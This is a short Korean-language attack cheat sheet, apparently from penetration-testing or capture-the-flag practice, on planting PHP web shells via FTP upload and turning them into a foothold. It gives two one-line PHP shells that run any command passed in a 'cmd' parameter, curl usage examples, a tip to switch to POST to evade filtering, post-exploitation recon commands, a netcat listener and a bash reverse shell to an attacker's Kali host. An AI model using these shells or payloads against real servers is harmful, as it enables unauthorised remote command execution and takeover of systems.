
 # GET 방식으로 지금처럼 QueryParam 으로 한 경우 거의 필터링에 걸리기 때문에 POST 방식 전환 필요


### 1\. ⚙️ `system()` 버전 (가장 선호)

  * 목표: 명령 실행 결과를 즉시 출력하고 싶을 때 사용.
  * 파일 내용 (`web-sys.php`):
    ```php
    <?php system($_GET['cmd']); ?>
    ```
  * 사용법:
      * FTP로 업로드 후, `cmd` 파라미터에 실행할 명령어를 전달합니다.
      * 예시: `curl http://[IP]/ftp/web-sys.php?cmd=whoami`

-----

### 2\. 🛡️ `shell_exec()` 버전 (우회용)

  * 목표: `system()` 함수가 서버에서 \*\*비활성화(필터링)\*\*되어 있을 때 우회용으로 사용.
  * 파일 내용 (`web-shell.php`):
    ```php
    <?php echo shell_exec($_GET['cmd']); ?>
    ```
  * 사용법:
      * `system()` 버전과 동일하게 `cmd` 파라미터에 명령어를 전달합니다.
      * 예시: `curl http://[IP]/ftp/web-shell.php?cmd=ls -la /`

-----

### 💡 초기 침투(Foothold) 핵심 명령어

웹 셸이 작동하는 것을 확인하면, 다음 명령어를 실행하여 \*\*리버스 셸 (Reverse Shell)\*\*을 획득할 준비를 합니다.

1.  권한 확인: `id` 또는 `whoami`
2.  커널 정보: `uname -a` (권한 상승 취약점 찾기)
3.  네트워크 확인: `ip a` (내부망 정보 확인)
4.  다음 단계: Kali에서 리스너(`nc -lvnp [PORT]`)를 열고, 웹 셸을 통해 리버스 셸 페이로드를 실행합니다.

> 리버스 셸 예시: `cmd=bash -i >& /dev/tcp/[Kali-IP]/[PORT] 0>&1`